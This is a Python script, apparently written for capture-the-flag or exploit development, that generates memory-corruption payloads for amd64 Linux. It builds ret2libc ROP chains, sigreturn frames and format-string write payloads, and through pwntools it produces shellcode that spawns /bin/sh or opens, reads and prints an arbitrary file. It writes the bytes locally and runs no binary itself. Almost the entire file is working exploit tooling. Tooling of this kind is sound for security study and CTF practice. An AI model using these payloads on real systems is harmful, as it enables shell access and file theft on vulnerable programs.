#!/usr/bin/env python3
"""Generate local exploit payload bytes; never run a binary or connect to a service."""
from __future__ import annotations

import argparse
import struct
import sys
from pathlib import Path


def ret2libc(offset: int, pop_rdi: int, argument: int, function: int, ret: int | None = None) -> bytes:
    if not 0 <= offset <= 1000000:
        raise ValueError('padding offset outside budget')
    chain = ([ret] if ret is not None else []) + [pop_rdi, argument, function]
    if any(value < 0 or value >= 2**64 for value in chain):
        raise ValueError('amd64 addresses must fit unsigned 64 bits')
    return b'A'*offset + struct.pack('<' + 'Q'*len(chain), *chain)


def number(value: str) -> int:
    return int(value, 0)


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    sub = parser.add_subparsers(dest='kind', required=True)
    chain = sub.add_parser('ret2libc', help='amd64 chain with measured gadget and function addresses')
    chain.add_argument('--offset', type=int, required=True)
    chain.add_argument('--pop-rdi', type=number, required=True)
    chain.add_argument('--argument', type=number, required=True)
    chain.add_argument('--function', type=number, required=True)
    chain.add_argument('--ret', type=number)
    srop = sub.add_parser('srop', help='amd64 sigreturn frame; requires pwntools')
    srop.add_argument('--register', action='append', required=True, help='register=value, e.g. rsp=0x404800')
    fmt = sub.add_parser('fmtstr', help='format-string write payload; requires pwntools')
    fmt.add_argument('--offset', type=int, required=True)
    fmt.add_argument('--write', action='append', required=True, help='address=value')
    fmt.add_argument('--bits', type=int, choices=[32,64], default=64)
    fmt.add_argument('--write-size', choices=['byte','short','int'], default='byte')
    fmt.add_argument('--numbwritten', type=int, default=0)
    shell = sub.add_parser('shellcraft', help='amd64 execve shellcode; requires pwntools and assembler')
    shell.add_argument('--path', default='/bin/sh')
    orw = sub.add_parser('orw', help='amd64 dynamic-fd open/read/write shellcode; requires pwntools and assembler')
    orw.add_argument('--path', required=True)
    orw.add_argument('--buffer', type=number, required=True)
    orw.add_argument('--count', type=int, default=256)
    for command in (chain,srop,fmt,shell,orw):
        command.add_argument('--output', type=Path, help='new payload file (existing files are refused)')
        command.add_argument('--raw', action='store_true', help='binary stdout; default is hex')
    args = parser.parse_args()
    try:
        if args.kind == 'ret2libc':
            payload = ret2libc(args.offset,args.pop_rdi,args.argument,args.function,args.ret)
        else:
            import pwn
            pwn.context.clear(arch='amd64', os='linux', endian='little')
            if args.kind == 'srop':
                frame = pwn.SigreturnFrame()
                for assignment in args.register:
                    key,value = assignment.split('=',1)
                    if key not in frame.registers.values():
                        raise ValueError('unknown amd64 sigreturn register: ' + key)
                    frame[key] = number(value)
                payload = bytes(frame)
            elif args.kind == 'fmtstr':
                pwn.context.bits = args.bits
                writes = {number(a): number(b) for a,b in (item.split('=',1) for item in args.write)}
                payload = pwn.fmtstr_payload(args.offset,writes,numbwritten=args.numbwritten,write_size=args.write_size)
            elif args.kind == 'shellcraft':
                payload = pwn.asm(pwn.shellcraft.execve(args.path))
            else:
                if not 1 <= args.count <= 1048576:
                    raise ValueError('ORW byte budget is 1..1048576')
                code = pwn.shellcraft.open(args.path,0)
                code += 'test rax, rax\njs .orw_failed\n'
                code += pwn.shellcraft.read('rax',args.buffer,args.count)
                code += 'test rax, rax\njs .orw_failed\n'
                code += pwn.shellcraft.write(1,args.buffer,'rax')
                code += pwn.shellcraft.exit(0)
                code += '.orw_failed:\n' + pwn.shellcraft.exit(1)
                payload = pwn.asm(code)
        if args.output:
            with args.output.open('xb') as handle:
                handle.write(payload)
        elif args.raw:
            sys.stdout.buffer.write(payload)
        else:
            print(payload.hex())
        return 0
    except (ValueError, OSError, ImportError) as error:
        parser.error(str(error))
        return 2


if __name__ == '__main__':
    raise SystemExit(main())
